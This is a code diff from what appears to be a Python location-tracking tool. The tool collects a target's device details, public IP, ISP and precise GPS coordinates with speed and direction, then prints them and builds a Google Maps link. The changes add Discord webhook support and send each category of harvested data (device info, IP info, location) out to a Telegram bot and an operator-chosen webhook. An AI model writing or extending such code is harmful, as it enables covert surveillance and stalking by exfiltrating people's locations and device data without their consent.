@@ -129,22 +129,26 @@ def banner():
 	utils.print(f'{G}[>] {C}Version      : {W}{VERSION}\n')
 
 
-def send_webhook(content):
+def send_webhook(content, msg_type):
 	if webhook is not None:
 		if not webhook.lower().startswith('http://') and not webhook.lower().startswith('https://'):
-			utils.print(f'{R}[-] {C}Provided webhook endpoint is not correct should be http or https scheme, on a POST method and unauthenfied{W}')
+			utils.print(f'{R}[-] {C}Protocol missing, include http:// or https://{W}')
 			return
-		cpt = 3
-		for i in range(cpt):
-			rqst = None
-			try:
-				rqst = requests.post(webhook, json=content)
-			except Exception:
+		if webhook.lower().startswith('https://discord.com/api/webhooks'):
+			from discord_webhook import sender
+			sender(webhook, msg_type, content)
+		else:
+			cpt = 3
+			for i in range(cpt):
 				rqst = None
-			if rqst and rqst.ok:
-				return
-			time.sleep(i + 1)
-		utils.print(f'{R}[-] {C}Unable to reach the webhook endpoint, ensure it listens on a POST method and unauthenfied{W}')
+				try:
+					rqst = requests.post(webhook, json=content)
+				except Exception:
+					rqst = None
+				if rqst and rqst.ok:
+					return
+				time.sleep(i + 1)
+			utils.print(f'{R}[-] {C}Unable to reach the webhook endpoint, ensure it listens on a POST method and unauthenfied{W}')
 
 
 def send_telegram(content):
@@ -322,9 +326,9 @@ def data_parser():
 {G}[+] {C}Browser    : {W}{var_browser}
 {G}[+] {C}Public IP  : {W}{var_ip}
 '''
-		send_telegram(device_info)
-		send_webhook(info_json)
 		utils.print(device_info)
+		send_telegram(device_info)
+		send_webhook(info_json, 'device_info')
 
 		if ip_address(var_ip).is_private:
 			utils.print(f'{Y}[!] Skipping IP recon because IP address is private{W}')
@@ -352,8 +356,9 @@ def data_parser():
 {G}[+] {C}Org       : {W}{var_org}
 {G}[+] {C}ISP       : {W}{var_isp}
 '''
-				send_telegram(ip_info)
 				utils.print(ip_info)
+				send_telegram(ip_info)
+				send_webhook(data, 'ip_info')
 
 	with open(RESULT, 'r') as result_file:
 		results = result_file.read()
@@ -363,7 +368,6 @@ def data_parser():
 			utils.print(f'{R}[-] {C}Exception : {R}{traceback.format_exc()}{W}')
 		else:
 			status = result_json['status']
-			send_webhook(result_json)
 			if status == 'success':
 				var_lat = result_json['lat']
 				var_lon = result_json['lon']
@@ -382,11 +386,12 @@ def data_parser():
 {G}[+] {C}Direction : {W}{var_dir}
 {G}[+] {C}Speed     : {W}{var_spd}
 '''
-				send_telegram(loc_info)
 				utils.print(loc_info)
+				send_telegram(loc_info)
+				send_webhook(result_json, 'location')
 				gmaps_url = f'{G}[+] {C}Google Maps : {W}https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}'
-				send_telegram(gmaps_url)
 				utils.print(gmaps_url)
+				send_telegram(gmaps_url)
 
 				if kml_fname is not None:
 					kmlout(var_lat, var_lon)
